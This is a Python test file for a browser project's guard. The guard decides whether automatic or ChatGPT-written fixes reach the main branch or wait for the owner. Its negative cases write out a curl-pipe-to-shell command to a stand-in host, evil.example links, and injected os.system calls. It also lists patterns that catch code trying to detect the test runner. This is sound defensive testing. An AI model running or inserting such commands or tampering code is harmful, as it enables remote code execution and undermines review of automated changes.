"""1.1.19, the owner's decisions: a green fix of the automation or of ChatGPT
goes into main by itself when it changes no test and no protected file
(tools/automerge.py); GitHub itself mails the owner, through issues with
exact titles, that a release is ready to publish (with the command) and that
ChatGPT has to step in."""

import importlib.util
import re
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
WORKFLOWS = ROOT / ".github" / "workflows"


def load(name):
    spec = importlib.util.spec_from_file_location(name.replace("-", "_"), ROOT / "tools" / ("%s.py" % name))
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


merge = load("automerge")
guard = load("check-autofix-patch")
REPO = "NullSector-2077/IKE-Browser"


RELEASE = "C'E' UNA NUOVA RELEASE IN MAIN PRONTA DA PUBBLICARE!!!"
CHATGPT = "ATTENZIONE E' RICHIESTO IL TUO INTERVENTO PER FARE INTERVENIRE CHAT GPT NELL' AUTOFIX!!!"


def test_github_itself_tells_the_owner():
    """The owner's words: GitHub mails the owner (an issue assigned to the
    owner and naming the owner; its title is the mail's subject), never a
    mail service of ours: no address, password or mail secret anywhere."""
    rr = (WORKFLOWS / "release-ready.yml").read_text()
    af = (WORKFLOWS / "autofix.yml").read_text()
    assert 'title="%s"' % RELEASE in rr and '--assignee "$OWNER"' in rr and 'echo "@$OWNER:' in rr
    assert ("[ -d ~/IKE-Browser/.git ] || git clone https://github.com/NullSector-2077/IKE-Browser.git ~/IKE-Browser; "
            "cd ~/IKE-Browser && git checkout main && git pull --ff-only && python3 tools/publish.py") in rr
    assert 'gh issue close "$open"' in rr and 'gh release view "v$version"' in rr      # closed once published
    assert "7 * 86400" in rr and "<!-- release-ready: $version -->" in rr               # weekly reminder, one per version
    plan = load("autofix-plan")
    assert plan.ISSUE_TITLE % "Tests" == CHATGPT + " (Tests)"
    assert 'title="%s ($WORKFLOW)"' % CHATGPT in af and '--assignee "$GITHUB_REPOSITORY_OWNER"' in af
    assert 'echo "@$GITHUB_REPOSITORY_OWNER:' in af
    for path in [*WORKFLOWS.glob("*.yml"), *(ROOT / "tools").glob("*.py")]:
        text = path.read_text()
        assert not re.search(r"[\w.+-]+@gmail\.com", text), path.name
        assert "MAIL_" not in text and "smtplib" not in text, path.name
    assert not (ROOT / "tools" / "send-mail.py").exists()


def pr(ref="automation/autofix-main", repo=REPO, draft=True):
    return {"number": 7, "state": "open", "draft": draft, "title": "fix", "base": {"ref": "main"},
            "head": {"ref": ref, "sha": "a" * 40, "repo": {"full_name": repo}}}


OK_CHECKS = [{"name": "tests", "status": "completed", "conclusion": "success"},
             {"name": "sandbox", "status": "completed", "conclusion": "success"},
             {"name": "hand-over", "status": "completed", "conclusion": "skipped"}]
BASE = """from PyQt6.QtWidgets import QLabel


class Win:
    def title(self):
        self.label = QLabel("I.K.E.")
        return 1
"""
CODE = [{"filename": "ike/window.py", "status": "modified", "patch": "@@ -1 +1 @@\n-a = 1\n+a = 2",
         "old_source": BASE, "new_source": BASE.replace("return 1", "return 2")},
        {"filename": "CHANGELOG.md", "status": "modified",
         "patch": "@@ -3,0 +4,2 @@\n+## 1.1.20\n+- Automatic fix"}]
COMMITS = [{"commit": {"message": "autofix: attempt 1 after a failure of \"Tests\"\n\nPrepared by..."}}]
VERSION = [{"filename": "ike/__init__.py", "status": "modified",
            "patch": '@@ -5 +5 @@\n-__version__ = "1.1.19"\n+__version__ = "1.1.20"'},
           {"filename": "PKGBUILD", "status": "modified", "patch": "@@ -2 +2 @@\n-pkgver=1.1.19\n+pkgver=1.1.20"},
           {"filename": "README.md", "status": "modified",
            "patch": "@@ -9 +9 @@\n-**Version 1.1.19** - see [CHANGELOG.md](CHANGELOG.md).\n"
                     "+**Version 1.1.20** - see [CHANGELOG.md](CHANGELOG.md)."}]


def decide(p=None, commits=COMMITS, files=CODE, checks=OK_CHECKS, **kw):
    return merge.decide(REPO, p or pr(), commits, files, checks, lambda n: guard.allowed_path(n, False), **kw)


def f(name, patch="@@ -1 +1 @@\n-a = 1\n+a = 2", status="modified", new=None):
    out = {"filename": name, "status": status, "patch": patch}
    if name.endswith(".py"):
        out.update(old_source=BASE, new_source=new if new is not None else BASE.replace("return 1", "return 2"))
    return out


def py(added):
    """A change of ike/window.py that adds these lines inside the method."""
    new = BASE.replace("        return 1", "".join("        %s\n" % line for line in added) + "        return 1")
    return f("ike/window.py", "@@ -6,0 +7,%d @@\n" % len(added) + "\n".join("+" + x for x in added), new=new)


def test_a_green_fix_of_interface_code_is_merged():
    assert decide() == ("merge", "")
    assert decide(files=CODE + VERSION) == ("merge", "")                 # the automation's own version raise
    assert decide(files=CODE + VERSION, published=True) == ("merge", "")  # a published version raised
    gpt = OK_CHECKS + [{"name": "guard", "status": "completed", "conclusion": "success"}]
    assert decide(pr("chatgpt/fix-20261121-0505"), commits=[{"commit": {"message": "Fix the tab bar"}}],
                  checks=gpt) == ("merge", "")


def test_the_automations_own_jobs_are_not_waited_for():
    """Review 4, N7: the job that asks for the merge is itself a check of the
    commit; waiting for it ended the deciding run on "wait" for good."""
    own = [{"name": n, "status": "in_progress", "conclusion": None} for n in ("merge-ready", "hand-over", "merge")]
    assert decide(checks=OK_CHECKS + own) == ("merge", "")
    text = (ROOT / "tools" / "automerge.py").read_text()
    assert "for _round in range(16):" in text and "time.sleep(30)" in text      # read again for a while


def test_a_harmless_interface_change_still_merges():
    """The syntax-tree rule keeps what is risky for a person, not every change."""
    assert decide(files=[py(["self.label.setToolTip('Tab ' + str(2))", "n = len(self.label.text()) + 1"])]) \
        == ("merge", "")


def test_it_waits_while_checks_run():
    assert decide(checks=OK_CHECKS + [{"name": "Arch Linux", "status": "in_progress"}])[0] == "wait"
    assert decide(checks=OK_CHECKS[:1])[0] == "wait"                    # the sandbox tests have not run (H3)
    assert decide(pr("chatgpt/fix-1"), commits=[{"commit": {"message": "x"}}])[0] == "wait"   # no guard yet


def test_everything_else_waits_for_a_person():
    """Review 2 of 1.1.19: C1 (the update channel moved by two harmless-looking
    files), M1-M5, M9, and the earlier rules."""
    cases = {
        # C1: a new file, and a line that sets where updates come from
        "update channel": decide(files=[f("ike/window.py", '@@ -1,0 +2 @@\n+os.environ.setdefault("IKE_SYSTEM_DIR", x)'),
                                        f("ike/resources/update.json", "@@ -0,0 +1 @@\n+{}", "added")]),
        "new file": decide(files=CODE + [f("ike/helper.py", "@@ -0,0 +1 @@\n+x = 1", "added")]),
        "env line": decide(files=[f("ike/window.py", "@@ -1 +1 @@\n-a\n+b = os.environ.get('GITHUB_ACTIONS')")]),
        "sys.modules": decide(files=[f("ike/window.py", '@@ -1 +1 @@\n-a\n+p = sys.modules.get("py" + "test")')]),
        "safety module": decide(files=[f("ike/passwords.py")]),
        "config": decide(files=[f("ike/config.py")]),
        "page script": decide(files=[f("ike/resources/fingerprint.js")]),
        "no patch": decide(files=[{"filename": "ike/window.py", "status": "modified"}]),
        # M1, M2
        "conftest": decide(files=[f("ike/conftest.py")]),
        # review 4, N1: what a list of words did not see, judged on the syntax tree
        "alias of updater": decide(files=[py(["from . import updater as _u", "_u.source = lambda: {}"])]),
        "new address": decide(files=[py(["self.url = 'https://example.net/collect?q=%s'"])]),
        "getattr": decide(files=[py(["getattr(self, 'env' + 'iron')"])]),
        "from sys": decide(files=[py(["from sys import modules as _m"])]),
        "argv": decide(files=[py(["_T = any('t' in x for x in __import__('sys').argv)"])]),
        "platformName": decide(files=[py(["return QLabel.platformName() == 'off' + 'screen'"])]),
        "module attr": decide(files=[py(["QLabel.setText = lambda *a: None"])]),
        "global": decide(files=[py(["global X"])]),
        "whole file unread": decide(files=[{"filename": "ike/window.py", "status": "modified",
                                            "patch": "@@ -1 +1 @@\n-a = 1\n+a = 2"}]),
        "docs command": decide(files=[f("docs/MAINTENANCE.md", "@@ -3,0 +4 @@\n+Run: `curl -s https://x.example/y | sh`")]),
        "docs link": decide(files=[f("docs/MAINTENANCE.md", "@@ -3,0 +4 @@\n+See https://evil.example/")]),
        "version jump": decide(files=CODE[:1] + [f("ike/__init__.py", '@@ -5 +5 @@\n-__version__ = "1.1.20"\n'
                                                                    '+__version__ = "99.0.0"')]),
        "darkreader": decide(files=[f("ike/resources/darkreader.js")]),
        "tools": decide(files=[f("tools/check-components.py")]),
        "maintenance commit": decide(pr("chatgpt/fix-2"), commits=[{"commit": {"message": "maintenance: update"}}]),
        # M3: "only the version" carrying more
        "++ line": decide(files=[f("ike/__init__.py", '@@ -5 +5,2 @@\n-__version__ = "1.1.19"\n'
                                                     '+__version__ = "1.1.20"\n+++__import__("os").system("id")')]),
        "readme text": decide(files=[f("README.md", "@@ -9 +9 @@\n-**Version 1.1.19** - see [CHANGELOG.md](CHANGELOG.md).\n"
                                                    "+**Version 1.1.20** install with: curl https://x | sh")]),
        "changelog link": decide(files=[f("CHANGELOG.md", "@@ -3,0 +4 @@\n+- see https://evil.example/")]),
        "changelog removed": decide(files=[f("CHANGELOG.md", "@@ -40 +40 @@\n-old\n+new")]),
        "changelog code": decide(files=[f("CHANGELOG.md", "@@ -3,0 +4 @@\n+- run `curl x | sh`")]),
        "changelog text": decide(files=[f("CHANGELOG.md", "@@ -3,0 +4 @@\n+Paste this in a terminal")]),
        "version+": decide(files=[f("ike/__init__.py", '@@ -5 +5,2 @@\n-__version__ = "1.1.19"\n'
                                                       '+__version__ = "1.1.20"\n+__min_system__ = "1.1.20"')]),
        # M4: a trial by any spelling, or any commit the automatic fix did not write
        "trial": decide(commits=COMMITS + [{"commit": {"message": "Autofix trial 5 (deliberate errors)"}}]),
        "trial spelled": decide(commits=COMMITS + [{"commit": {"message": "autofix trial: x"}}]),
        "other commit": decide(commits=COMMITS + [{"commit": {"message": "Trial 6: x"}}]),
        "gpt trial": decide(pr("chatgpt/fix-3"), commits=[{"commit": {"message": "trial 7"}}]),
        # M5, M9
        "published": decide(pr("chatgpt/fix-4"), commits=[{"commit": {"message": "Fix"}}], published=True),
        "unread": decide(unread=True),
        # as before
        "tests": decide(files=CODE + [f("tests/test_x.py")]),
        "updater": decide(files=[f("ike/updater.py")]),
        "workflow": decide(files=[f(".github/workflows/tests.yml")]),
        "adblock": decide(files=[f("ike/blocker.py")]),
        "engine": decide(files=[f("ike-adblock/Cargo.toml")]),
        "youtube": decide(files=[f("ike/resources/videoads.js")]),
        "removed": decide(files=[{"filename": "ike/x.py", "status": "removed"}]),
        "failed": decide(checks=OK_CHECKS + [{"name": "Arch Linux", "status": "completed", "conclusion": "failure"}]),
        "person": decide(pr("fix/1.1.20-something")),
        "maintenance": decide(pr("automation/daily-maintenance")),
        "fork": decide(pr(repo="someone/IKE-Browser")),
    }
    wrong = {k: v for k, v in cases.items() if v[0] != "person"}
    assert not wrong, wrong


def test_the_workflows_are_wired():
    am = (WORKFLOWS / "automerge.yml").read_text()
    assert 'workflows: ["Tests", "Security", "ChatGPT fix guard", "Arch Linux"]' in am
    assert "ref: main" in am and "tools/automerge.py" in am and "persist-credentials: false" in am
    # H1: the automation's own runs start it with a dispatch; M8: a queue per commit
    assert "workflow_dispatch:" in am and "github.event.inputs.sha || github.event.workflow_run.head_sha" in am
    assert "group: automerge-${{ github.event.inputs.sha || github.event.workflow_run.head_sha }}" in am
    tests = (WORKFLOWS / "tests.yml").read_text()
    sec = (WORKFLOWS / "security.yml").read_text()
    for text in (tests, sec):
        assert "merge-ready:" in text and 'gh workflow run automerge.yml --ref main -f sha="$SHA"' in text
    assert "gh workflow run release-ready.yml --ref main" in tests                    # H2
    assert "github.ref_name == 'main')) ||" in tests                                  # H2: hand-over on main
    assert "A test that must fail still fails" in tests                               # H4
    assert "sandbox-issue:" in sec and "--label sandbox-failed" in sec                # H3
    af = (WORKFLOWS / "autofix.yml").read_text()
    assert 'retry gh workflow run security.yml --ref "$PUSH_BRANCH"' in af             # H3
    text = (ROOT / "tools" / "automerge.py").read_text()
    # since 2026-11-22 nothing merges into main by itself (the owner's decision)
    assert "/merge" not in text and "merge_method" not in text
    rr = (WORKFLOWS / "release-ready.yml").read_text()
    assert "for check in tests sandbox" in rr and "group: release-ready" in rr          # H3, M6
    assert 'select(.author.login == "github-actions")' in rr and "--state closed" in rr   # M6
    assert "(merged by itself" in rr                                                    # C1: listed for the owner
    pub = load("publish")
    assert pub.tests_passed([{"name": "tests", "conclusion": "success"}], "sandbox") == "missing"
    assert "\"sandbox\"" in (ROOT / "tools" / "publish.py").read_text()


def test_every_notice_names_the_owner():
    """M7: with the recommended notification settings, GitHub mails only what
    assigns or names the owner."""
    for name in ("daily-check.yml", "daily-maintenance.yml", "security.yml"):
        text = (WORKFLOWS / name).read_text()
        assert '--assignee "$GITHUB_REPOSITORY_OWNER"' in text and "@$GITHUB_REPOSITORY_OWNER" in text, name
    assert '"--assignee", owner' in (ROOT / "tools" / "automation-health.py").read_text()
    sec = (WORKFLOWS / "security.yml").read_text()
    assert "--label rust-advisories" in sec and "in:title" not in sec


def test_the_guard_finds_the_test_run_by_other_names():
    """H4: lines under ike/ that find pytest or the runner without naming it."""
    for line in ('p = sys.modules.get("py" + "test")', "import importlib", "x = __import__('os')",
                 "if os.environ.get('GITHUB_ACTIONS'):", "import atexit", "f = sys._getframe(1)",
                 "inspect.stack()", "if os.environ.get('CI'):"):
        assert guard.PRODUCT_TAMPERING.search(line), line
    assert not guard.PRODUCT_TAMPERING.search("self.tabs.setCurrentIndex(i)")


def test_a_strangers_pull_request_on_the_same_commit_is_not_taken(monkeypatch, capsys):
    """L5: the pull request is chosen among this repository's own branches."""
    stranger = dict(pr(repo="someone/IKE-Browser"), number=99)
    monkeypatch.setattr(merge, "api", lambda path: [stranger] if "pulls?state=open" in path else [])
    merge.main(["--repo", REPO, "--sha", "a" * 40, "--dry-run"])
    assert "no pull request of the automation or of ChatGPT" in capsys.readouterr().out


def test_no_fix_can_change_the_rules_it_is_judged_by():
    """An automatic or ChatGPT fix touching tools/automerge.py could change
    the merge rules for the next ones: both tools are protected files."""
    assert "tools/automerge.py" in guard.FORBIDDEN_FILES
    assert decide(files=[f("tools/automerge.py")])[0] == "person"


def _candidate_check():
    text = (WORKFLOWS / "daily-maintenance.yml").read_text()
    step = text.split("- name: The candidate changes only what an update may change", 1)[1]
    body = step.split("<<'PY'\n", 1)[1].split("\n          PY\n", 1)[0]
    return "\n".join(line[10:] for line in body.splitlines()) + "\n"


def test_the_maintenance_candidate_changes_only_update_files(tmp_path):
    """H5, and review 4's N2: code of others runs while the candidate is made;
    what it may leave is a fixed list of files in the update's own commit, the
    version files with only the version, and automatic fixes only as the fix
    job published them."""
    import subprocess
    import sys
    script = tmp_path / "check.py"
    script.write_text(_candidate_check())
    repo = tmp_path / "r"
    repo.mkdir()

    def git(*a):
        return subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@t", *a], cwd=repo, check=True,
                              capture_output=True, text=True).stdout

    def write(name, text):
        p = repo / name
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(text)
    git("init", "-q", "-b", "main")
    write("ike/__init__.py", '__version__ = "1.1.20"\n__min_system__ = "1.0.1"\n')
    write("PKGBUILD", "pkgname=ike-browser\npkgver=1.1.20\npkgrel=1\n")
    write("ike/updater.py", "x = 1\n")
    write("README.md", "x\n")
    git("add", "-A")
    git("commit", "-q", "-m", "start")
    git("update-ref", "refs/remotes/origin/main", "main")

    def candidate(changes, message="maintenance: update bundled components for IKE 1.1.21", carry=None):
        git("checkout", "-q", "-B", "cand", "main")
        for name, text in changes.items():
            write(name, text)
        git("add", "-A")
        git("commit", "-q", "-m", message)
        git("update-ref", "refs/ike/candidate", "cand")
        return subprocess.run([sys.executable, "-I", str(script), str(ROOT), "o/r"], cwd=repo,
                              capture_output=True, text=True)
    version = {"ike/__init__.py": '__version__ = "1.1.21"\n__min_system__ = "1.0.1"\n',
               "PKGBUILD": "pkgname=ike-browser\npkgver=1.1.21\npkgrel=1\n"}
    ok = candidate(dict(version, **{"ike-adblock/Cargo.lock": "x\n", "ike/resources/darkreader.js": "x\n"}))
    assert ok.returncode == 0, ok.stdout + ok.stderr
    bad = candidate({"ike/resources/ubo-scriptlets.json": "x\n", "ike/updater.py": "evil\n"})
    assert bad.returncode == 1 and "ike/updater.py" in bad.stdout, bad.stdout
    code = candidate({"ike/__init__.py": '__version__ = "1.1.21"\nimport os; os.system("id")\n'})
    assert code.returncode == 1 and "more than the version" in code.stdout, code.stdout
    assert candidate({"README.md": "y\n"}, message="something else").returncode == 1
    # an "autofix:" commit the fix job did not publish
    forged = candidate({"ike/updater.py": "evil\n"}, message="autofix: attempt 1 after a failure of Tests")
    assert forged.returncode == 1 and "not one the fix job published" in forged.stdout, forged.stdout
    # the same change published on the candidate branch by the fix job: carried
    git("checkout", "-q", "-B", "published", "main")
    write("ike/updater.py", "fixed\n")
    git("add", "-A")
    git("commit", "-q", "-m", "autofix: attempt 1 after a failure of Tests")
    git("update-ref", "refs/remotes/origin/automation/daily-maintenance", "published")
    carried = candidate({"ike/updater.py": "fixed\n"}, message="autofix: attempt 1 after a failure of Tests")
    assert carried.returncode == 0, carried.stdout + carried.stderr


def test_a_real_maintenance_candidate_passes_the_check(tmp_path):
    """The check must not stop the daily candidate itself: one made by
    tools/prepare-maintenance.py (a new engine, the version raised, a new
    CHANGELOG entry), and one that adds to a version not yet published."""
    import json
    import shutil
    import subprocess
    import sys
    script = tmp_path / "check.py"
    script.write_text(_candidate_check())
    repo = tmp_path / "r"

    def git(*a):
        return subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@t", *a], cwd=repo, check=True,
                              capture_output=True, text=True).stdout
    for rel in ("ike/__init__.py", "PKGBUILD", "README.md", "CHANGELOG.md"):
        (repo / rel).parent.mkdir(parents=True, exist_ok=True)
        shutil.copy(ROOT / rel, repo / rel)
    git("init", "-q", "-b", "main")
    git("add", "-A")
    git("commit", "-q", "-m", "start")
    git("update-ref", "refs/remotes/origin/main", "main")
    report = tmp_path / "report.json"
    report.write_text(json.dumps({"errors": 0, "components": [{
        "name": "AdBlock engine (adblock-rust)", "current": "0.10.0", "latest": "0.10.1",
        "update": True, "note": "", "also": ""}]}))
    version = re.search(r'__version__ = "([^"]+)"', (ROOT / "ike/__init__.py").read_text()).group(1)
    for keep in ([], ["--keep-version"]):
        git("checkout", "-q", "-B", "cand", "main")
        subprocess.run([sys.executable, str(ROOT / "tools/prepare-maintenance.py"), "--root", str(repo),
                        "--report", str(report), "--base-version", version, *keep], check=True)
        (repo / "ike-adblock").mkdir(exist_ok=True)
        (repo / "ike-adblock" / "Cargo.lock").write_text("new\n")
        git("add", "-A")
        git("commit", "-q", "-m", "maintenance: update bundled components")
        git("update-ref", "refs/ike/candidate", "cand")
        res = subprocess.run([sys.executable, "-I", str(script), str(ROOT), "NullSector-2077/IKE-Browser"],
                             cwd=repo, capture_output=True, text=True)
        assert res.returncode == 0, (keep, res.stdout + res.stderr)


def test_a_green_harmless_fix_waits_for_the_owners_order(monkeypatch):
    """2026-11-22, the owner's decision: no agent merges into main by itself.
    A fix that would have merged is marked ready and the owner is told once;
    the workflow cannot merge (its token only reads the contents)."""
    calls = []
    sha = "a" * 40
    pr = {"number": 7, "draft": True, "title": "fix", "head": {"sha": sha, "ref": "automation/autofix-main",
                                                                 "repo": {"full_name": "o/r"}},
          "base": {"sha": "b" * 40}}

    def api(path):
        if path.startswith("repos/o/r/pulls?"):
            return [pr]
        if "/check-runs" in path:
            return {"check_runs": []}
        return []
    monkeypatch.setattr(merge, "api", api)
    monkeypatch.setattr(merge, "gh", lambda *a: calls.append(a) or "")
    monkeypatch.setattr(merge, "decide", lambda *a, **k: ("merge", ""))
    monkeypatch.setattr(merge, "_guard", lambda: type("G", (), {"allowed_path": lambda self, n, x: True})())
    monkeypatch.setattr(merge, "released", lambda *a: False)
    monkeypatch.setattr(merge, "version_of_main", lambda: "1.0")
    monkeypatch.setattr(merge, "unread_merge", lambda *a: False)
    assert merge.main(["--repo", "o/r", "--sha", sha]) == 0
    flat = [" ".join(map(str, c)) for c in calls]
    assert not any("/merge" in c or "merge_method" in c for c in flat), flat
    assert any(c.startswith("pr ready 7") for c in flat), flat
    assert any(c.startswith("pr comment 7") and "tuo ordine" in c for c in flat), flat
    am = (WORKFLOWS / "automerge.yml").read_text()
    assert "contents: write" not in am and "contents: read" in am
